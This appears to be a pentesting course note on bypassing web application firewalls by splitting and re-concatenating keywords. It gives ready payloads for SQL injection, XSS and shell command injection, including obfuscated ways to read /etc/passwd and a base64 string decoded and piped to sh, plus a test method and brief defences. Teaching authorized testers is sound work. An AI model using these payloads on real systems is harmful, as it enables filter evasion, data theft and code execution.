---
tags: [waf, evasion, bypass, vapt]
difficulty: advanced
module: "39 - WAF Bypass Techniques"
topic: "39.09 Keyword Splitting and Concatenation"
---

# 39.09 Keyword Splitting and Concatenation WAF Bypass

## 1. Introduction

Keyword Splitting and Concatenation is an advanced Web Application Firewall (WAF) evasion technique designed specifically to defeat signature-based detection systems. When a WAF utilizes strict regular expressions to look for explicit malicious keywords (e.g., `SELECT`, `UNION`, `javascript:`, `alert`, `document.cookie`), an attacker can fracture these keywords into smaller, seemingly benign substrings. 

Once the fragmented payload bypasses the WAF's static inspection, the attacker relies on the backend application, database engine, or client-side interpreter to natively concatenate and reassemble these substrings back into the executable payload.

This technique exploits a fundamental asymmetry: WAFs generally evaluate the HTTP request statically, without executing the code, whereas the backend environment evaluates and executes expressions dynamically.

This document details the methods used to split and combine strings across various technologies, including SQL databases, command shells, and JavaScript engines, providing actionable vectors for VAPT engagements.

---

## 2. The Mechanics of the Bypass

The bypass operates on the principle of **Dynamic Reassembly**. The WAF analyzes a static string and fails to find a continuous malicious signature. The backend evaluates the syntax, executes the concatenation functions, joins the strings, and executes the resulting reconstructed payload.

### 2.1 Execution Flow Diagram

```text
+-------------------------------------------------------------+
|                        ATTACKER                             |
|  Payload: EXEC('SE' + 'LECT * FROM users')                  |
+-----------------------------+-------------------------------+
                              |
                              v
+-----------------------------+-------------------------------+
|                      WAF / FILTER                           |
| 1. Receives HTTP Request.                                   |
| 2. Evaluates against Rule: /SELECT/i                        |
| 3. Regex Match Execution:                                   |
|    String contains 'SE' and 'LECT'.                         |
|    Does not contain continuous 'SELECT'.                    |
| 4. Match: FALSE                                             |
| 5. Decision: ALLOW (Traffic Forwarded)                      |
+-----------------------------+-------------------------------+
                              |
                              v
+-----------------------------+-------------------------------+
|                   BACKEND DATABASE ENGINE                   |
| 1. Processes dynamic SQL function: EXEC()                   |
| 2. Evaluates internal expression: 'SE' + 'LECT * FROM users'|
| 3. String concatenation occurs natively.                    |
| 4. Final constructed string: "SELECT * FROM users"          |
| 5. Executes the final string.                               |
+-----------------------------+-------------------------------+
                              |
                              v
+-----------------------------+-------------------------------+
|                    PAYLOAD EXECUTION                        |
| Target tables exfiltrated successfully.                     |
+-------------------------------------------------------------+
```

---

## 3. Technology-Specific Splitting and Concatenation

Different languages and databases use distinctly different operators and functions for string concatenation. A successful attacker must fingerprint the backend and tailor the payload to the specific environment.

### 3.1 SQL Injection (Dynamic Execution)

To execute concatenated strings in SQL, the query typically cannot be executed as standard static SQL. It must be passed to an execution function that accepts dynamic SQL strings (e.g., `EXEC()`, `EXECUTE()`, `sp_executesql`, or `PREPARE`).

#### Microsoft SQL Server (MSSQL)
MSSQL uses the `+` operator for string concatenation. This makes MSSQL highly vulnerable to this technique when stacked queries are permitted.
- **Keyword:** `UNION SELECT`
- **Concatenated:** `'UN' + 'ION SE' + 'LECT'`
- **Execution Payload:** `EXEC('SELECT * FROM users WHERE username = ''' + @user + '''')`
- **Bypass Example:** `?id=1; EXEC('SE'+'LECT user,password FR'+'OM users')--`

*Note:* You cannot directly run `'SE'+'LECT 1,2,3'` as a query. It must be passed to an execution sink like `EXEC()`.

#### MySQL / MariaDB
MySQL uses the `CONCAT()` function or, in some configurations, `||` (if the `PIPES_AS_CONCAT` SQL mode is enabled). To execute dynamic queries, Prepared Statements must be used, which requires multiple stacked statements.
- **Bypass Example:**
  ```sql
  SET @a = CONCAT('SEL','ECT * FROM users');
  PREPARE stmt FROM @a;
  EXECUTE stmt;
  ```
While lengthy and requiring stacked queries (which are often disabled in PHP/MySQL environments), this is highly effective against WAFs when applicable.

#### Oracle
Oracle uses the `||` operator for concatenation. Dynamic SQL can be executed via `EXECUTE IMMEDIATE`.
- **Bypass Example:**
  `EXECUTE IMMEDIATE 'SEL' || 'ECT * FROM users';`

### 3.2 Cross-Site Scripting (XSS) / JavaScript

JavaScript is a highly dynamic language and offers numerous ways to split and concatenate strings. This is extremely useful for bypassing WAFs filtering words like `alert`, `prompt`, or `cookie`.

#### The `+` Operator and Execution Sinks
If a WAF blocks the word `alert`, you can construct the string dynamically and pass it to an execution sink like `eval()`, `setTimeout()`, or the `Function` constructor.
- **Payload:** `eval('al' + 'ert(1)')`
- **Payload:** `setTimeout('al'+'ert(1)')`
- **Payload:** `[]["filter"]["constructor"]("al"+"ert(1)")()`

#### Window Object Bracket Notation
In JavaScript, global functions are properties of the global `window` object. You can access properties using bracket notation, which accepts dynamic strings.
- **Original:** `alert(1)`
- **Bypass:** `window['al' + 'ert'](1)`
- **Bypass:** `window['al\x65rt'](1)` (Using hex encoding within the string)

#### Template Literals
ES6 Template literals allow for complex interpolation and evasion.
- **Bypass:** ``window[`al${'e'}rt`](1)``
The WAF sees `al${'e'}rt`, misses the signature, and the browser compiles it back to `alert`.

### 3.3 Command Injection (OS Shells)

Operating system shells offer incredible flexibility for splitting keywords, often without requiring dynamic execution functions like SQL does.

#### Linux / Bash
Bash allows splitting strings using quotes, variables, and backslashes.
- **Quote Splitting:** `cat /etc/passwd` becomes `c"a"t /et'c'/pa'ss'wd`
  The bash parser ignores the quotes when evaluating the command name.
- **Variable Expansion:** 
  ```bash
  a=ca; b=t; $a$b /etc/passwd
  ```
- **Uninitialized Variables:**
  `c$@at /etc/pa$@sswd` or `c$u at /etc/passwd` (where `$u` is uninitialized and resolves to an empty string).
- **Backslash Escape:**
  `c\a\t /e\t\c/p\a\s\s\w\d`

#### Windows CMD / PowerShell
Windows CMD uses the caret `^` to escape characters, which can split strings effectively.
- **Caret Splitting:** `c^a^t c:\windows\win.ini`
- **PowerShell Variable Splitting:**
  ```powershell
  $a="Write-H"; $b="ost"; Invoke-Expression "$a$b Hello"
  ```
- **PowerShell Backticks:** `W`r`i`t`e`-`H`o`s`t

---

## 4. Advanced Obfuscation Combinations

Keyword splitting is rarely used alone. It is a fundamental technique for constructing complex, highly obfuscated payloads that defeat advanced parsers.

### 4.1 Reverse Strings
Instead of just splitting, an attacker can reverse the string and use a backend function to flip it back, completely masking the keyword.
- **MySQL:** `EXECUTE IMMEDIATE REVERSE('sresu MORF * TCELES')`
- **Bash:** `$(rev <<< 'tac') /etc/passwd`

### 4.2 Base64 / Hex Encoding with Dynamic Decoding
Send the payload encoded, decode it dynamically, and execute it. This is a form of programmatic concatenation/reassembly.
- **PHP:** `assert(base64_decode('cGhwaW5mbygpOw=='))`
- **Bash:** `echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh`

### 4.3 Substring Extraction
Instead of concatenating explicit string fragments, extract the needed letters from existing environmental strings.
- **JavaScript:** `window[(typeof Object)[0] + (typeof location)[1] + (typeof document)[2] + 'rt'](1)`
  This extracts 'o', 't', 'r' from `typeof` results to build 'alert'.

---

## 5. Identifying WAF Vulnerabilities to Splitting

**Testing Methodology:**
1. **Establish the Block:** Send a blatant payload: `?cmd=cat /etc/passwd` (Blocked with 403).
2. **Attempt Quote Splitting:** Send `?cmd=c"a"t /etc/passwd`.
   - *If executed:* The WAF uses simple regex and does not normalize shell semantics. Bypass successful.
3. **Attempt Variable Splitting:** Send `?cmd=a=ca;b=t;$a$b /etc/passwd`.
   - *If executed:* The WAF lacks execution context awareness.
4. **For SQLi:** Determine if stacked queries are supported. If they are, attempt `EXEC()` variations with `+` concatenation for MSSQL.

---

## 6. Defensive Strategies

Defending against dynamic splitting and concatenation is exceptionally difficult for legacy WAFs, as it blurs the line between data and code.

1. **Semantic Analysis:** The WAF must understand the syntax of the underlying language. For command injection, the WAF should recognize bash escaping characters (like `\`, `"`, or `$@`) and normalize/strip them before evaluation.
2. **Execution Sandboxing (RASP):** Runtime Application Self-Protection (RASP) is the ultimate defense here. Because RASP sits inside the application runtime (e.g., inside the Java JVM, Node.js engine, or .NET CLR), it inspects the final, dynamically constructed string right before it is passed to the database driver or shell exec function, making string splitting completely useless.
3. **Strict Allowlisting:** Enforcing strict input validation (e.g., ensuring an ID only contains digits) prevents the injection of concatenation operators or quotes in the first place, stopping the attack at the application layer.

---

## 7. Chaining Opportunities

- **[[06 - Case Variation]]:** Combining case variation with concatenation: `'sE' + 'lEcT'`.
- **[[04 - Encoding and Obfuscation]]:** Using hex encoded strings within the concatenation: `'al\x65' + 'rt'`.
- **[[10 - HTTP Parameter Pollution]]:** Splitting the payload across multiple HTTP parameters, then having the backend concatenate them natively (e.g., ASP.NET's comma concatenation).
- **[[14 - Advanced Command Injection]]:** Heavily relies on keyword splitting to evade OS-level filtering.

## 8. Related Notes
- [[01 - Introduction to WAF Evasion]]
- [[12 - Advanced SQLi Evasion]]
- [[14 - Advanced Command Injection]]
- [[21 - XSS Contexts and Payloads]]
